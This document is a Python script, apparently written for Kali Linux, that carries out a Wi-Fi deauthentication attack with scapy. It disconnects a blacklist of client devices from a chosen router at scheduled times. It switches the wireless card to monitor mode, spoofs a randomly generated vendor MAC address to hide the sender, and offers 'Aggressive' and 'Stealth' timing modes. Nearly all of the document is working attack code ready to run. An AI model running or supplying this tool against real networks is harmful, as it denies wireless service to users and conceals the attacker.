# Date: 07/27/2017
# Distro: Kali linux
# Author: Ethical-H4CK3R
# Description: Deauthenticates Clients From A Network

import os
import time
import random
import argparse
import threading
import subprocess
from scapy.all import *

class Deauthenticate(object):
 '''Disconnects by sending packets to ap & client'''
 def __init__(self,bssid):
  conf.verb = 0
  self.pkts = []
  self.alive = True
  self.bssid = bssid
  self.iface = None
  self.clients = []

 def configAttack(self):
  self.pkts = []
  for client in self.clients:
   self.pkts.append(RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=self.bssid,addr3=self.bssid)/Dot11Deauth(reason=7))

 def sendPkts(self,*args,**kwargs):
  [sendp(pkt,iface=self.iface) for _ in range(5) for pkt in self.pkts if self.alive]

class TimeManager(object):
 '''Handles time'''
 def __init__(self,hr_start,mn_start,pd_start,hr_end,mn_end,pd_end):
  self.atk = False
  self.alive = True
  # self.status = False
  # when to start
  self.hr_s = hr_start # hour
  self.mn_s = mn_start # minute
  self.pd_s = pd_start # period
  # when to end
  self.hr_e = hr_end
  self.mn_e = mn_end
  self.pd_e = pd_end

 def now(self):
  nw = time.strftime('%I:%M %p',time.localtime())
  hour = nw[:2]
  minute = nw[3:5]
  period = nw[6:]
  return [hour,minute,period]

 def manageTime(self):
  while self.alive:
   now = self.now()
   # check start time
   if self.startAtk(now):
    self.atk = True
   # check end time
   if self.endAtk(now):
    self.atk = False
   time.sleep(.5)

 def startAtk(self,now):
  hr,mn,pd = now[0],now[1],now[2]
  return True if all([hr == self.hr_s,mn == self.mn_s,pd == self.pd_s]) else False

 def endAtk(self,now):
  hr,mn,pd = now[0],now[1],now[2]
  return True if all([hr == self.hr_e,mn == self.mn_e,pd == self.pd_e]) else False

class Generator(object):
 def __init__(self):
  self.post = 'ABCDEF0123456789'
  self.pre = [
               '00:aa:02',# Intel
               '00:13:49',# Zyxel
               '00:40:0b',# Cisco
               '00:1c:df',# Belkin
               '00:24:01',# D-link
               '00:e0:4c',# Realtek
               '00:e0:ed',# Silicom
               '00:0f:b5',# Netgear
               '00:27:19',# Tp-link
               '00:0A:F7',# Broadcom
             ]

 def getPrefix(self):
  shuffled = random.sample(self.pre,len(self.pre))
  return shuffled[random.randint(0,len(self.pre)-1)]

 def getPostfix(self):
  return self.post[random.randint(0,len(self.post)-1)]

 def generate(self):
  post = ['{}{}:'.format(self.getPostfix(),self.getPostfix()) for n in range(3)]
  post = ''.join(post)[:-1]
  return '{}:{}'.format(self.getPrefix(),post)

class Interface(Generator):
 def __init__(self,iface):
  super(Interface,self).__init__()
  self.iface = iface
  self.devnull = open(os.devnull,'w')
  self.macAddress = self.generate()

 def managedMode(self):
  self.destroyInterface()

 def monitorMode(self):
  self.createInterface()
  subprocess.Popen('ifconfig {} down'.format(self.iface),stdout=self.devnull,stderr=self.devnull,shell=True).wait()
  subprocess.Popen('iwconfig {} mode monitor'.format(self.iface),stdout=self.devnull,stderr=self.devnull,shell=True).wait()
  subprocess.Popen('macchanger -m {} {}'.format(self.macAddress,self.iface),stdout=self.devnull,stderr=self.devnull,shell=True).wait()
  subprocess.Popen('ifconfig {} up'.format(self.iface),stdout=self.devnull,stderr=self.devnull,shell=True).wait()

 def createInterface(self):
  subprocess.Popen('iw {} interface add mon0 type monitor'.format(self.iface),stdout=self.devnull,stderr=self.devnull,shell=True).wait()
  self.iface = 'mon0'

 def destroyInterface(self):
  subprocess.Popen('iw dev mon0 del',stdout=self.devnull,stderr=self.devnull,shell=True).wait()

class Engine(Deauthenticate,TimeManager,Interface):
 '''Disconnect a router & a client using scapy on a certain time'''
 def __init__(self,blacklist,iface,mode,mac,hr_start,mn_start,pd_start,hr_end,mn_end,pd_end):
  Interface.__init__(self,iface)
  Deauthenticate.__init__(self,mac)
  TimeManager.__init__(self,hr_start,mn_start,pd_start,hr_end,mn_end,pd_end)

  self.atk = False
  self.alive = True
  self.delay = 35 if mode == 'S' else 1
  self.blacklist = blacklist

 def display(self):
  while self.alive:
   ends = '{}:{} {}'.format(self.hr_e,mn_e,pd_e)
   starts = '{}:{} {}'.format(self.hr_s,mn_s,pd_s)
   mode = 'Aggressive' if self.delay == 1 else 'Stealth'
   subprocess.call(['clear'])
   if self.atk:
    print 'Status\n[-] Mode: {}\n[-] Attacking: True\n[-] Attacking Ends: {}'.format(mode,ends)
   else:
    print 'Status\n[-] Mode: {}\n[-] Attacking: False\n[-] Attacking Starts: {}'.format(mode,starts)
   time.sleep(.5)

 def wait(self):
  for n in range(self.delay):
   if not self.alive:break
   time.sleep(1)

 def readFile(self):
  # reads blacklist
  with open(self.blacklist,'r') as f:
   self.clients = [n.replace('\n','').strip() for n in f]

 def attack(self):
  self.configAttack()
  map(self.sendPkts,range(256))

 def run(self):
  threading.Thread(target=self.manageTime).start() # keeps track of time
  threading.Thread(target=self.display).start() # display status
  while self.alive:
   if self.atk:
    self.readFile()
    self.attack()
    self.wait()
   else:
    time.sleep(.5)

if __name__ == '__main__':
 # assign arugments
 userArgs = argparse.ArgumentParser()
 userArgs.add_argument('interface',help='wireless interface')
 userArgs.add_argument('bssid',help='bssid of router')
 userArgs.add_argument('mode',help='[A]ggressive [S]tealth') # Aggressive: 1 sec; Stealth: 35 sec
 userArgs.add_argument('blacklist',help='path to blacklist with mac addresses')
 userArgs.add_argument('startTime',help='time to start attack. 12 format Time; Enter 05:12')
 userArgs.add_argument('startPeriod',help='AM/PM')
 userArgs.add_argument('endTime',help='time to stop  attack. 12 format Time; Enter 10:05')
 userArgs.add_argument('endPeriod',help='AM/PM')
 args=userArgs.parse_args()

 # assign variables
 mac = args.bssid
 wlan = args.interface
 mode = args.mode[0].upper()
 blacklist = args.blacklist
 hr_e,mn_e,pd_e = args.endTime[:2],args.endTime[3:5],args.endPeriod.upper()
 hr_s,mn_s,pd_s = args.startTime[:2],args.startTime[3:5],args.startPeriod.upper()
 engine = Engine(blacklist,wlan,mode,mac,hr_s,mn_s,pd_s,hr_e,mn_e,pd_e)

 try:
  # start
  engine.iface = wlan
  engine.monitorMode()
  engine.run()
 except KeyboardInterrupt:
  engine.alive = False
  engine.managedMode()
